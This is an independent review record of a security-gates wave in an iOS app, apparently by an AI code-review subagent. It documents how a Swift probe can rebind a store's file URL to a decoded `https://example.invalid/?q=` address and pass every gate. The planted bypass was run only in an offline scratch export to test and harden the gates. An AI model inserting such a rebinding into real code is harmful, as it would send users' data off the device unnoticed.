---
record_type: review
id: backlog-gates-review
status: ratified
seat: independent
process_version: v6.6
date: 2026-10-14
---
# Independent review, round 4: the gates and licences wave (#253, #247, #246, #244, #261, D-197)

**Reviewer:** Code-Reviewer subagent (fresh eyes; did not author any commit in the range)
**Independent:** yes
**Date:** 2026-10-14
**Commit range:** `2891f15..d78a6be` (16 commits). Round 4 reads round 3's fixes, `d78a6be`, against round 3
(`docs/reviews/backlog-gates-review-round-3.md`), then the whole range once more. Rounds 1 and 2 are
`docs/reviews/backlog-gates-review-round-1.md` and `-round-2.md`.
**Risk tier:** HIGH for #244 and #246 (the compiled privacy gate, INV-62, INV-64, INV-67); MEDIUM for
the rest

## Verdict
MAJOR

Round 3's three probes reproduce exactly as round 3 measured. Each passes the compiled gate, and the
text pin refuses each by the spelling G-13 now names. The citation fixes are right: every "round N's X"
points at that round's finding. The two `test_credits.py` reads go through `_swift`, and a `/* */` copy
of the sheet line now fails.

But G-13's new sentence still claims more than the gate and the pins hold:
- **M1.** G-13 says the stores' `isFileURL` guards cover their own `load()`, and that the text pin refuses
  the three decode forms. A URL decoded with its type inferred and bound to `url` between `load()`'s
  guard and its one permitted read passes the compiled gate, both pin files, the whole Python suite and
  the whole Swift suite. The guard runs, on the store's own `url`, before the rebinding. #242's
  correction repeats the claim.

Two minor findings (N1, N2).

How the review was done:
- **Reading.** Rounds 1 to 3 and their dispositions; `d78a6be` whole; G-13, INV-62, INV-67, INV-78 and
  the G-15 closure note; the process log entry; the egress pin and `EGRESS_EXACT`
  (`tests/unit/test_router_hints.py:588-830`); the store (`ios/ModelRanking/Engine/FrontDoor.swift:278-337`);
  `FrontDoorTests`; `OfflineTestCase.swift`; `_swift`; `test_credits.py`; the app, engine and credits
  changes in the range; #242's last three comments (one read through `gh`).
- **Plants.** I exported `d78a6be` to a scratch tree outside the seat (`git archive`). Every plant went
  into that tree. After each one the file was restored and a byte compare against the seat's file
  passed. The seat's tree is unchanged.
- **What ran on each plant.** The full compiled gate (`scripts/client_decl_gate.py`, self-test plus the
  four configurations); `test_router_hints.py` and `test_ios_client_contract.py` (115 tests); where named,
  the whole Python suite and the Swift suite inside `scripts/offline.sb` with
  `MODEL_RANKING_REQUIRE_OFFLINE=1`, as `make swift-test` runs it.
- **Baselines on the export.** Gate: `client-decls PASS: 21 client file(s) in 4 configuration(s)`. Pins:
  115 passed. Swift, offline: 633 tests, 0 failures.
- **Checks.** `make check-fast` passes in the seat at `d78a6be` with this record added (119 s, six legs),
  and `make check-records` passes.
- **Network.** No test reached the network. Every planted address is `example.invalid`. In the Swift runs
  the offline tripwire answers every request with "not connected", inside the offline sandbox.
- **Held-out discipline.** I read no held-out file.

## Round 3's dispositions, re-measured

| Round 3 | Holds? | Measured |
|---|---|---|
| M1 | In part | Round 3's probes, rebuilt and appended to `FrontDoor.swift`. P1 (`r4Decode([URL].self, encoded)?.first`, then `Data(contentsOf: target)`): gate PASS in four configurations; pin refuses by `[<\[,(]\s*URL\b`. P2 (`var target = GapRegisterStore.onDevice.url; target = r4Decode(encoded) ?? target`, then `Data(contentsOf: target)`): gate PASS; pin refuses by `\bcontentsOf\s*:`. P3 (`private typealias R4Place = URL`, a decode of `[R4Place]`, then `GapRegisterStore(url: target).load()`): gate PASS; pin refuses by `\btypealias\b`. Each time 1 failed, 114 passed. So G-13's spellings are right for these three. INV-62 (`docs/security-invariants.md:123`), INV-67 (`:128`) and the process log (`docs/process-log.md:853-856`) say only what is held: a decode whose type prints as `URL`, with a `typealias` and a generic helper not held. G-13 (`:197`) claims more: M1 below. |
| N1 | Yes | Every citation, by `git grep`: D-197 (`docs/decisions.md:5073`, `:5077`) is round 1's N2 and N1; `scripts/check_records.py:1578` and `tests/unit/test_wave_check_m21_rules.py:820` are round 1's N3; the fixtures (`ContentView.swift:272`, `EngineClient.swift:61`, `FrontDoor.swift:11`), `scripts/client_decl_gate.py:159`, `:353`, `:464`, `:1960` and `tests/unit/test_client_decl_gate.py:913`, `:944` are round 1's M1 and M2; `src/app/workflows/board_tables.py:128`, `tests/unit/test_arc_agi_2.py:122`, `tests/unit/test_credits.py:255` are round 1's N2; `test_credits.py:276` is round 1's N1; `tests/unit/test_security_invariants.py:354` is round 1's N4; `scripts/client_decl_gate.py:1840` and `tests/unit/test_client_decl_gate.py:528` are round 2's N1; `test_credits.py:169`, `:193` are round 3's N2; G-13's "rounds 2 and 3, M1" are both the generic decode. Each matches. Two unscoped citations remain in the process log: N2 below. |
| N2 | In part | `tests/unit/test_credits.py:170` and `:194` read through `_swift`. Planted in `ios/ModelRanking/ContentView.swift`: the live `.sheet(isPresented: $showingCredits) { creditsSheet }` removed, `test_the_credits_button_opens_the_sheet` fails (control); replaced by a `/* */` copy, it fails. Replaced by a `//` copy, it passes: N1 below. The process log (`:850-851`) and the G-15 closure note (`docs/security-invariants.md:224-225`) are scoped to the two pin files. |
| N3 | Yes | Recorded. |
| K1 | Yes | #275, known. |
| R1 | Accepted | G-10, #243. |

## Findings

### BLOCKING
- none

### MAJOR

- **M1** `docs/security-invariants.md:197` (G-13: "The stores' `isFileURL` guards cover only their own
  `load()` and `save()`, not a second `Data(contentsOf:)` in the same file; what refuses the three forms
  today is the text pin `test_the_gap_register_code_carries_no_egress_spelling_the_pin_reads`, by their
  spellings"), and #242's comment of 2026-10-14T12:09:57Z ("What refuses all three today is the egress
  text pin"): a decoded URL bound to `url` inside `load()`, after the guard, is refused by neither.
  - **The shape.** `load()` is `guard url.isFileURL, let data = try? Data(contentsOf: url), ...`
    (`ios/ModelRanking/Engine/FrontDoor.swift:316-318`). The guard checks the store's own `url`. A clause
    between the two can bind a new local `url`, and the one permitted `Data(contentsOf: url)` then reads it.
    The pin permits that read as an exact expression, once (`tests/unit/test_router_hints.py:722`), and it
    is still spelled exactly so.
  - **Measured.** A generic helper `r4Decode<T: Decodable>(_ data: Data) -> T?` appended to
    `FrontDoor.swift`, and two clauses put between the guard and the read:

    ```swift
    guard url.isFileURL,
          let encoded = try? JSONEncoder().encode("ht" + "tps://example.invalid/?q=" + GapRegisterStore.r4Last),
          let url = writeOptions.contains(.completeFileProtection) ? r4Decode(encoded) ?? Optional(url) : Optional(url),
          let data = try? Data(contentsOf: url),
    ```

    with `static var r4Last = ""` on `GapRegisterStore`, set by `GapRegister.record`.

    | Probe | Compiled gate | Pins (115) | Python suite | Swift suite, offline |
    |---|---|---|---|---|
    | P4: the rebinding on every store | PASS, 4 configurations | 115 passed | not run | 2 failures: the round trips (`FrontDoorTests.swift:777`, `:856`), and the tripwire recorded `https://example.invalid/` |
    | P6: the rebinding on the on-device store only (`.completeFileProtection`) | PASS, 4 configurations | 115 passed | 2797 passed, 88 skipped | all passed |

    No test builds the on-device store and loads it, so P6 passes every gate in the repository. The
    guard runs and passes, on the store's own file URL.
  - **What P6 does in the app.** The view loads the register once, at launch
    (`ios/ModelRanking/ContentView.swift:49`). So P6 fetches an `https` address the store's file chose,
    from the store's file (INV-62: only `EngineClient.swift` reaches the network). As planted, the
    question it carries is empty at launch. Carrying the reader's words needs the one read to run twice,
    for example in a loop. I did not build that form.
  - **Why the text is wrong.** P6 is G-13's own "type inferred" form. The guard does not cover it, though
    it sits in `load()`. The pin does not refuse it: there is no `[URL`, no second `contentsOf:` and no
    `typealias`. INV-62 and INV-67 say "a URL decoded through a generic helper ... is not held (G-13)",
    which is true. G-13 then names two backstops for that gap, and neither holds this form.
  - **Failure scenario.** #242's allowlist work plans from G-13 and #242's correction, which both say the
    pin covers the generic decode today. A refactor of `load()` adds a small generic decode helper and a
    clause before the read. Every gate passes, `swift test` included, and the gap register's file
    reaches the network.
  - **Remedy.** Make the pin hold the guard and the read together, so no clause can sit between them. In
    `EGRESS_EXACT`, replace the key `("FrontDoor.swift", "Data(contentsOf: url)")` with
    `("FrontDoor.swift", "guard url.isFileURL,\n              let data = try? Data(contentsOf: url),")`,
    and do the same for `StandingsStore.swift` (`:732`), whose `load()` has the same shape. Measured on the
    export: the shipping client still passes (115 passed); P6 then fails the pin ("must contain ...
    exactly once"). A new local `url` bound before the guard is then checked by it. Then say in G-13 that
    the pin holds the guard and the read as one expression, and correct #242 again. If the pin is not
    changed, say in G-13 and on #242 that a URL rebound between the guard and the read is held by nothing.

### MINOR (the author fixes each in this wave or files it as an issue)

- **N1** `tests/unit/test_credits.py:170-173` and `:194-195`: the two reads go through `_swift`, which
  keeps `//` comments, and the asserts are plain substring checks that do not cut a line at `//`. So a
  `//` copy of a required line satisfies them.
  - **Measured.** Live `.sheet(isPresented: $showingCredits) { creditsSheet }` removed: the test fails
    (control). Replaced by `// .sheet(...) { creditsSheet }` on its own line: passes. Kept only as a
    trailing `//` comment on `@State private var showingCredits = false` (`ContentView.swift:52`):
    passes. A `/* */` copy fails. Restored; byte-identical.
  - **Why it matters.** Round 3's N2 disposition says "A commented copy of the sheet line now fails". That
    is true of a block comment only. `_swift`'s docstring says pins cut a line at `//`
    (`tests/unit/test_ios_client_contract.py:39`); these two do not. The same holds for
    `test_the_credits_sheet_shows_what_the_engine_layer_decides`'s substring asserts (`:173`, `:183`).
    The licence-text pin (`:284`) is not affected: its regex needs `"""` at a line's start.
  - **Remedy.** Cut each line at `//` before matching (as the contract pins do), or read through
    `test_router_hints._code`, which drops comments. Or file it with #275.

- **N2** Records left behind by the round-3 fixes.
  - `docs/process-log.md:855` ("since the review's M2") and `:858` ("since the review's M1"): unscoped.
    The bare id `backlog-gates-review` is now round 3, which has no M2. Both mean round 1. `:855`'s "the
    round-3 probe" means the M21-W3 review's round 3, which reads as this wave's round 3 now.
  - `docs/reviews/backlog-gates-review-round-3.md:224-229`: round 3's dispositions table keeps its six blank rows
    above the six filled ones, so each id appears twice, once with no disposition.
  - `scripts/client_decl_gate.py:43-44` (module docstring): "a URL its own code makes is held on the
    compiled module by nothing (G-13, #246)". Since #246 a URL initialiser or decode by name in a store is
    refused, and the register's file references only its Foundation list (G-13). The docstring predates
    the range; #246 made it stale.
  - #242's comments of 2026-10-14T11:14:16Z and 11:49:50Z link `docs/reviews/backlog-gates-review-round-3.md`,
    which is now round 3's file. The correction names the rounds, but the links still open round 3.
  - **Remedy.** Say "round 1's" at `:855` and `:858`, and "the M21-W3 review's round-3 probe"; delete the
    blank rows; rewrite the docstring's sentence to match G-13; add the right file names to #242.

### PASS (what looks good)
- **Round 3's probes.** All three reproduce, and the spellings G-13 names are the ones that refuse them.
- **The citations.** Every "round N's X" in the tree points at the right finding (table above).
- **The invariant rows.** INV-62 and INV-67 claim only the printed type, and name the generic helper and
  the `typealias` as not held.
- **The credits reads.** Through `_swift`; a block-comment copy now fails.
- **The rest of the range.** The licence texts, the notices and the ARC-AGI-2 solutions credit read as
  rounds 1 to 3 measured. `CreditsScreen.licenceTexts` matches by prefix, once each
  (`ios/ModelRanking/Engine/Models.swift:433-440`). The Swift test holds both texts and the notices
  (`ios/EngineTests/CreditsTests.swift:93-129`). I found nothing new there.

## Producers of the hardened invariants
- **INV-62 and INV-67, the stores' URLs.**
  - Producers: `FrontDoor.swift` (`GapRegisterStore.load()`, `save(_:)`, `onDevice`) and
    `StandingsStore.swift` (`load()`, `save(_:at:)`, `onDevice`).
  - Citing tests: `test_a_store_makes_a_url_only_from_the_file_systems_folders`,
    `test_the_stores_shipping_urls_pass`, `test_the_gap_registers_file_references_only_its_listed_foundation_declarations`
    (`tests/unit/test_client_decl_gate.py:912`), the staleness test (`:527`), the egress pin
    (`tests/unit/test_router_hints.py:588`), `FrontDoorTests.testTheRegisterIsOnlyEverAFileOnThisDevice`
    (`ios/EngineTests/FrontDoorTests.swift:815`), the round trips (`:769`, `:848`), and
    `StandingsStoreTests.testAStorePointedAnywhereButAFileReadsNothing`.
  - Gaps: M1 (a URL rebound between a store's guard and its read); G-13 (#242).
- **INV-64, the request's sources.**
  - Producers: assignments and key paths to `ContentView.task`; the engine client's members reached from
    another file.
  - Citing tests: `test_a_file_reaches_only_the_engine_clients_listed_members`
    (`tests/unit/test_client_decl_gate.py:941`), and `:527` for the list's staleness.
  - Gaps: G-11 (#242).
- **INV-78, how pins read Swift.**
  - Producers: the pins in `test_router_hints.py`, `test_ios_client_contract.py`, and `test_credits.py`'s
    three `_swift` reads.
  - Citing tests: `test_a_swift_read_in_this_file_goes_through_code` (`tests/unit/test_router_hints.py:1171`)
    and its twin in `test_ios_client_contract.py`.
  - Gaps: G-14; N1 (`test_credits.py` does not cut at `//`); #275 (other pin files read raw).

## Acceptance criteria evidence
- **Round 3 M1.** Text at `docs/security-invariants.md:123`, `:128`, `:197`; `docs/process-log.md:853-856`.
  The three probes: table above. Not yet accurate in G-13: M1.
- **Round 3 N1.** The citations listed in the table above, each read against its round's finding.
- **Round 3 N2.** `tests/unit/test_credits.py:170`, `:194`; `docs/process-log.md:850-851`;
  `docs/security-invariants.md:224-225`. Plants above.
- **Round 3 N3.** Round 3's dispositions table, `docs/reviews/backlog-gates-review-round-3.md:233`.
- **#253, #247, #246, #244, #261.** As rounds 1 to 3 measured; `d78a6be` changes no production code.

## K.8 contract drift check
- `d78a6be` changes comments, records and two test reads. No engine, `/v1` or gate code changes.
- The shared reader the credits pins now import:

  ```
  tests/unit/test_ios_client_contract.py:35:def _swift(path: pathlib.Path) -> str:
  tests/unit/test_credits.py:167:    from .test_ios_client_contract import _swift
  tests/unit/test_credits.py:191:    from .test_ios_client_contract import _swift
  tests/unit/test_credits.py:282:    from .test_ios_client_contract import _swift
  ```
- The pin's permitted reads, unchanged by the range:

  ```
  tests/unit/test_router_hints.py:722:    ("FrontDoor.swift", "Data(contentsOf: url)"): "REQ-GAP-001: the register reads its own file",
  tests/unit/test_router_hints.py:732:    ("StandingsStore.swift", "Data(contentsOf: url)"): "D-167: the store reads its own file",
  ```
- Verdict: OK.

## K.9 candidates spotted outside this wave's scope
- none

## Risks queued to next M
- **R1** M1's remedy is a text pin (G-14): it holds the guard and the read together only as spelled.
  The structural fix is #242's: record which call made each URL, and permit only the file-system makers in
  the stores. The sign it is real: a `load()` rewritten without that exact guard-and-read expression,
  with the pin's snippet updated to match, passes every gate again.

## Dispositions, by the author

| Finding | Disposition | Where |
|---|---|---|
| M1 | Filed as #276, under the owner's cap of four review rounds (2026-10-14): a MAJOR left after round 4 becomes an issue and the wave moves on. The issue carries the probe and the measured remedy. G-13 no longer says the pin refuses every form; it names this one and #276. #242 carries a second correction. | #276, `docs/security-invariants.md` |
| N1 | Fixed. `test_credits.py`'s two reads go through `_code`, which drops comments of both kinds; a `//` copy of the sheet line now fails `test_the_credits_button_opens_the_sheet` (planted, then restored). | `tests/unit/test_credits.py` |
| N2 | Fixed. The process log names the round of each "review's" and which review's round-3 probe; round 3's blank rows are gone; the gate's docstring says what #246 holds; #242's note says where each round now sits. | `docs/process-log.md`, `backlog-gates-review-round-3.md`, `scripts/client_decl_gate.py`, #242 |
| R1 | Accepted: the structural fix is #242's allowlist. | #242 |

